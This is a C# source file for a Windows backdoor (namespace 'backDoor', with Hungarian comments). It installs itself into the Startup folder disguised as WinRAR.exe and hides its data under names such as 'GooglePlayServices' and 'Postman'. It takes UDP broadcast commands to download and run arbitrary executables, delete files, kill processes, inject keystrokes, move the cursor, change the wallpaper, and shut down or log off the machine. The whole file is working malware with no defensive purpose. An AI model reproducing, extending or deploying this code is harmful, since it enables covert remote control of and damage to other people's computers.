using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Drawing.Imaging;

namespace backDoor
{
    internal class Program
    {


        [DllImport("user32")]
        public static extern void LockWorkStation();


        [DllImport("user32")]
        public static extern void ExitWindowsEx(GraphicsUnit uflags, uint dwReason);

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);


        // WinAPI hívás importálása
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SystemParametersInfo(
            int uAction, int uParam, string lpvParam, int fuWinIni);

        // Konstansok
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;

        public static void SetWallpaper(string path)
        {
            // Beállítja az új háttérképet
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        static async Task Main()
        {


            int PORTvissza = 6665;
            var udpVissza = new UdpClient();
            udpVissza.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);


            var broadCastEPVissza = new IPEndPoint(IPAddress.Broadcast, PORTvissza);

            udpVissza.Client.Bind(new IPEndPoint(IPAddress.Any, PORTvissza));
            udpVissza.EnableBroadcast = true;

            //---


            int PORT = 5555;
            string portS = "5555";
            //port randomizalas :
            string postmanPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Postman";
            if (!Directory.Exists(postmanPath))
            {
                Directory.CreateDirectory(postmanPath);
            }
            if (!File.Exists($"{postmanPath}\\log.dll"))
            {
                //File.Create($"{postmanPath}\\log.dll");
                File.WriteAllText($"{postmanPath}\\log.dll", "5555");
            }
            try
            {
                portS = File.ReadAllText($"{postmanPath}\\log.dll");
            }
            catch (Exception e)
            {

                Console.WriteLine();
            }
            
            if (string.IsNullOrEmpty(portS.Trim()))
            {
                portS = "5555";
            }

            PORT = Convert.ToInt32(portS);
            Console.WriteLine("siekres port beallitas : " + PORT);

            //---
            var udp = new UdpClient();
            udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);

            udp.Client.Bind(new IPEndPoint(IPAddress.Any, PORT));

            udp.EnableBroadcast = true;

            var broadCastEP = new IPEndPoint(IPAddress.Broadcast, PORT);
            byte[] data = Encoding.UTF8.GetBytes($"");
            await udp.SendAsync(data, data.Length, broadCastEP);


            string instruct = "getres";
            bool masATarget = false;

            string ezAzExeFajlHelyeEsNeve = Assembly.GetExecutingAssembly().Location;
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

            bool update = false;

            //Console.WriteLine(startupPath);

            

            if (Path.GetFileNameWithoutExtension(ezAzExeFajlHelyeEsNeve) == "update") update = true;



            if (Path.GetDirectoryName(ezAzExeFajlHelyeEsNeve) != startupPath)
            {
                
                if (File.Exists(startupPath + "\\WinRAR.exe"))//sort of autoupdate
                {
                    if (update)
                    {
                        Console.WriteLine("updating");
                        File.Delete(startupPath + "\\WinRAR.exe");
                        File.Copy(Assembly.GetExecutingAssembly().Location, startupPath + "\\WinRAR.exe");
                        Process.Start(startupPath + "\\WinRAR.exe");
                        Environment.Exit(0);
                    } else
                    {
                        //File.SetAttributes(startupPath + "\\WinRAR.exe", FileAttributes.Hidden);
                        Process.Start(startupPath + "\\WinRAR.exe");
                        Environment.Exit(0);
                    }
                    
                } else
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, startupPath + "\\WinRAR.exe");
                    Process.Start(startupPath + "\\WinRAR.exe");
                    Environment.Exit(0);
                }
                Environment.Exit(0);
            }

            
            

            //lW proxy
            if (File.Exists((Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR\\lW.exe")))
            {
                if (Process.GetProcessesByName("lW").Length ==0)
                {
                    Process.Start((Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR\\lW.exe"));
                }
                try
                {
                    File.Copy(ezAzExeFajlHelyeEsNeve, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR\\", true);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

            string appdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string workPath = appdataPath + "\\GooglePlayServices";
            string exetPath = workPath + "\\exet";
            string dataPath = workPath + "\\data";
            string updatePath = workPath + "\\update";
            if (!Directory.Exists(workPath)) Directory.CreateDirectory(workPath);
            if (!Directory.Exists(exetPath)) Directory.CreateDirectory(exetPath);
            if (!Directory.Exists(dataPath)) Directory.CreateDirectory(dataPath);
            if (!Directory.Exists(updatePath)) Directory.CreateDirectory(updatePath);

            //Console.WriteLine("uj verzio");

            while (true)
            {
                

                var result = await udp.ReceiveAsync();
                byte[] message = result.Buffer;
                string utasitas = Encoding.UTF8.GetString(message);
                //Console.WriteLine(utasitas);

                string valasz = GetLocalIPAddress() + " - " + Dns.GetHostName();
                data = Encoding.UTF8.GetBytes(valasz);

                if (utasitas == "rtarget")
                {
                    masATarget = false;
                    instruct = "";
                    Console.WriteLine("target ujrakalibralva");
                }

                if (!string.IsNullOrEmpty(instruct) && masATarget==false)//ha az instruct ba van valami
                {
                    switch (instruct)
                    {
                        /* kurva anyját nem tudtam megcsinalni a screenshitet
                        case "scrs":
                                instruct = "";
                            //screenshot csinálás : 
                            // képernyő mérete
                            System.Drawing.Rectangle bounds = Screen.PrimaryScreen.Bounds;

                            // bitmap a képernyő méretével
                            string path = dataPath + "\\screenshot.png";
                            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                            {
                                // "lemásolja" a képernyő tartalmát a bitmapra
                                using (Graphics g = Graphics.FromImage(bitmap))
                                {
                                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                                }

                                // elmenti a screenshotot
                                
                                bitmap.Save(path, ImageFormat.Png);

                                Console.WriteLine($"Screenshot mentve: {path}");
                                Console.WriteLine("vissza küldés feladónak..");
                            }

                            data = File.ReadAllBytes(path);
                            udpVissza.Send(data, data.Length, broadCastEPVissza);
                            continue;*/
                        
                        case "rPort":
                            instruct = "";
                            File.WriteAllText($"{postmanPath}\\log.dll", utasitas.Trim());

                            if (Process.GetProcessesByName("lW").Length>=1)
                            {
                                Environment.Exit(0);
                            } else
                            {
                                Process.Start(startupPath + "\\WinRAR.exe");
                                Environment.Exit(0);
                            }


                            PORT = Convert.ToInt32(File.ReadAllText($"{postmanPath}\\log.dll"));
                            continue;

                        case "eD":
                            instruct = "";
                            ProcessStartInfo psia = new ProcessStartInfo();

                            if (File.Exists($"{dataPath}\\eD.exe"))
                            {
                                psia.FileName = $"{dataPath}\\eD.exe";
                                psia.Arguments = utasitas;
                                Process.Start(psia);
                            } else
                            {
                                continue;
                            }
                            instruct = "";


                            continue;



                        case "setwallpaper":
                            try
                            {
                                if (utasitas.Contains("%desktop%")) utasitas = utasitas.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                                else if (utasitas.Contains("%appdata%")) utasitas = utasitas.Replace("%appdata%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                                else if (utasitas.Contains("%startup%")) utasitas = utasitas.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                                else if (utasitas.Contains("%startmenu%")) utasitas = utasitas.Replace("%startmenu%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));
                                SetWallpaper(utasitas);
                            }
                            catch (Exception e)
                            {
                                instruct = "";
                                Console.WriteLine(e);
                            }
                            


                            continue;
                        case "keystroke":
                            instruct = "";
                            SendKeys.SendWait(utasitas);
                            continue;


                        case "kill":
                            instruct = "";

                            foreach (var process in Process.GetProcessesByName(utasitas.Trim()))
                            {
                                process.Kill();
                            }


                            continue;


                        case "copy":
                            instruct = "";
                            //copy blob.exe c:/asd/asd/masikgepIde 
                            //copy blob.exe %desktop%/buzivagy 

                            //megérkezett kérés a virushoz : copy
                            //név packetSize packetCount path
                            string idePath = (utasitas.Split(' ')[3]);

                            if (idePath.Contains("%desktop%")) idePath = idePath.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                            else if (idePath.Contains("%appdata%")) idePath = idePath.Replace("%appdata%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                            else if (idePath.Contains("%startup%")) idePath = idePath.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                            else if (idePath.Contains("%startmenu%")) idePath = idePath.Replace("%startmenu%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));


                            // Küldés előtt:
                            int packetSize = Convert.ToInt32(utasitas.Split(' ')[1]);
                            int packetCount = Convert.ToInt32(utasitas.Split(' ')[2]);

                            string krealtExefajlNeve = idePath + "\\" + utasitas.Split(' ')[0];

                            // csomagok várása, és másolása egymás után:(fubazdmeg chat gpt)
                            using (FileStream fs = new FileStream(krealtExefajlNeve, FileMode.Create, FileAccess.Write))
                            {
                                for (int i = 0; i < packetCount; i++)
                                {
                                    byte[] buffer = udp.Receive(ref broadCastEP);
                                    try
                                    {
                                        fs.Write(buffer, 0, buffer.Length);
                                    }
                                    catch (Exception e)
                                    {

                                        Console.WriteLine(e);
                                    }
                                    
                                    Console.WriteLine($"Csomag {i + 1}/{packetCount} megérkezett, méret: {buffer.Length}");
                                }
                            }
                            
                            continue;

                        case "delete":
                            instruct = "";
                            try
                            {
                                if (utasitas.Contains("%desktop%")) utasitas = utasitas.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                                else if (utasitas.Contains("%appdata%")) utasitas = utasitas.Replace("%appdata%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                                else if (utasitas.Contains("%startup%")) utasitas = utasitas.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                                else if (utasitas.Contains("%startmenu%")) utasitas = utasitas.Replace("%startmenu%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));

                                try
                                {
                                    File.Delete(utasitas);
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e);
                                }
                                
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e);
                                
                            }
                            continue;

                        case "kys":
                            Environment.Exit(0);
                            continue;


                        case "update"://update---------------------------------------------
                            instruct = "";

                            // Küldés előtt:
                            Console.WriteLine(utasitas);
                            packetSize = Convert.ToInt32(utasitas.Split(' ')[1]);
                            packetCount = Convert.ToInt32(utasitas.Split(' ')[2]);

                            krealtExefajlNeve = updatePath + "\\" + utasitas.Split(' ')[0];

                            // csomagok várása, és másolása egymás után:(fubazdmeg chat gpt)
                            try
                            {
                                using (FileStream fs = new FileStream(krealtExefajlNeve, FileMode.Create, FileAccess.Write))
                                {
                                    for (int i = 0; i < packetCount; i++)
                                    {
                                        byte[] buffer = udp.Receive(ref broadCastEP);
                                        fs.Write(buffer, 0, buffer.Length);
                                        Console.WriteLine($"Csomag {i + 1}/{packetCount} megérkezett, méret: {buffer.Length}");
                                    }
                                }
                                if (Process.GetProcessesByName("lW").Length >= 1)
                                {
                                    Process.GetProcessesByName("lW")[0].Kill();
                                }

                                Process.Start(krealtExefajlNeve);//inditas
                                Environment.Exit(0);
                            }
                            catch (Exception e)
                            {

                                Console.WriteLine(e);
                            }

                            
                            continue;


                        case "target":
                            instruct = "";
                            Console.WriteLine($"[{utasitas}]");
                            Console.WriteLine($"[{Dns.GetHostName()}]");
                            if (utasitas == Dns.GetHostName())
                            {
                                Console.WriteLine("en vagyok a celpont hoppacskaxd");
                            } else masATarget = true;
                            
                            break;

                        case "mousex":
                            instruct = "";
                            try
                            {
                                var pos = System.Windows.Forms.Cursor.Position;
                                int mennyit = Convert.ToInt32(utasitas);
                                SetCursorPos(pos.X + mennyit, pos.Y);
                            }
                            catch (Exception e)
                            {

                                Console.WriteLine(e);
                            }
                            
                            break;

                        case "mousey":
                            instruct = "";
                            try
                            {
                                var pos = System.Windows.Forms.Cursor.Position;
                                int mennyit = Convert.ToInt32(utasitas);
                                SetCursorPos(pos.X, pos.Y + mennyit);
                            }
                            catch (Exception e)
                            {

                                Console.WriteLine(e);
                            }
                            break;


                        case "getres":
                            instruct = "";
                            valasz = $"\ngetres : { GetLocalIPAddress() + " - " + Dns.GetHostName()}";
                            data = Encoding.UTF8.GetBytes(valasz);
                            _ = udpVissza.SendAsync(data, data.Length, broadCastEPVissza);
                            break;
                        //----------------------egyszeru commandok : ----------------------------
                        case "msgb":
                            instruct = "";

                            File.WriteAllText(dataPath + "\\emesgebox.vbs", $"msgbox \"{utasitas}\"");
                            Process.Start(dataPath + "\\emesgebox.vbs");
                            Console.WriteLine("emesgebox elinditvaxd");
                            break;
                        case "exet":
                            instruct = "";

                            // Küldés előtt:
                            packetSize = Convert.ToInt32(utasitas.Split(' ')[1]);
                            packetCount = Convert.ToInt32(utasitas.Split(' ')[2]);

                            krealtExefajlNeve = exetPath + "\\" + utasitas.Split(' ')[0];

                            // csomagok várása, és másolása egymás után:(fubazdmeg chat gpt)
                            try
                            {
                                using (FileStream fs = new FileStream(krealtExefajlNeve, FileMode.Create, FileAccess.Write))
                                {
                                    for (int i = 0; i < packetCount; i++)
                                    {
                                        byte[] buffer = udp.Receive(ref broadCastEP);
                                        fs.Write(buffer, 0, buffer.Length);
                                        Console.WriteLine($"Csomag {i + 1}/{packetCount} megérkezett, méret: {buffer.Length}");
                                    }
                                }

                                ProcessStartInfo psi = new ProcessStartInfo();
                                
                                psi.FileName = krealtExefajlNeve; // vagy a screenshotoló exe
                                psi.UseShellExecute = true; // fontos!
                                //psi.Verb = "runas"; // ha admin jog kell, különben kihagyható
                                Process.Start(psi);//inditas
                            }
                            catch (Exception)
                            {
                                Console.WriteLine("szarvagy");
                            }
                            


                            break;
                        case "processS":
                            instruct = "";
                            try
                            {
                                if (utasitas.Contains("%desktop%")) utasitas = utasitas.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                                else if (utasitas.Contains("%appdata%")) utasitas = utasitas.Replace("%appdata%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                                else if (utasitas.Contains("%startup%")) utasitas = utasitas.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                                else if (utasitas.Contains("%startmenu%")) utasitas = utasitas.Replace("%startmenu%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));
                                Process.Start(utasitas);
                            }
                            catch (Exception e)
                            {
                                instruct = "";
                                Console.WriteLine(e);
                            }
                            break;
                        //---------------------unalmas commandok:-------------------------------
                        case "logoff":
                            instruct = "";
                            Console.WriteLine(utasitas);
                            try
                            {
                                ExitWindowsEx(0, 0);
                                MessageBox.Show("kilogoffolt a géped báttya");
                            }
                            catch (Exception e)
                            {
                                instruct = "";
                                Console.WriteLine(e);
                            }
                            break;
                        case "shutdown":
                            instruct = "";
                            Console.WriteLine(utasitas);
                            try
                            {
                                Process.Start("shutdown.exe", "-s -t 00");
                            }
                            catch (Exception e)
                            {
                                instruct = "";
                                Console.WriteLine(e);
                            }
                            break;
                        case "restart":
                            instruct = "";
                            Console.WriteLine(utasitas);
                            try
                            {
                                Process.Start("shutdown.exe", "-r -t 00");
                            }
                            catch (Exception e)
                            {
                                instruct = "";
                                Console.WriteLine(e);
                            }
                            break;
                        default:
                            instruct = utasitas;
                            break;
                    }

                }
                instruct = utasitas;
                //Console.WriteLine($"Üzenet {result.RemoteEndPoint}: {message}");
                //Console.WriteLine($"{message}");
            }
        }
        public static string GetLocalIPAddress() //https://stackoverflow.com/questions/6803073/get-local-ip-address
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }
    }
}
